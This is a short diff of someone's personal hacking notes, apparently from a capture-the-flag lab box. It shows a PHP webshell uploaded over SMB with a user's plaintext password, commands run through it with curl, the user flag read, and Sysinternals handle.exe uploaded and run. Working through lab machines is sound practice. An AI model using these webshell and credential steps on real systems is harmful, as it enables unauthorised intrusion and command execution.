@@ -216,3 +216,12 @@ hm....php webshell time :)
 smbclient '//10.129.6.180/new-site' -U 'tyler' --password '92g!mA8BGjOirkL%OG*&' -c 'put ./webshell.php webshell.php'
 
 curl "http://10.129.6.180:8808/webshell.php?cmd=dir"
+
+www-data@10.129.6.180 > type C:\users\tyler\desktop\user.txt
+
+smbclient '//10.129.6.180/new-site' -U 'tyler' --password '92g!mA8BGjOirkL%OG*&' -c 'put /home/henrypost/Downloads/handle.exe handle.exe'
+
+
+neat. i can drop sysinternals `handle.exe` on this.
+
+handle.exe -accepteula
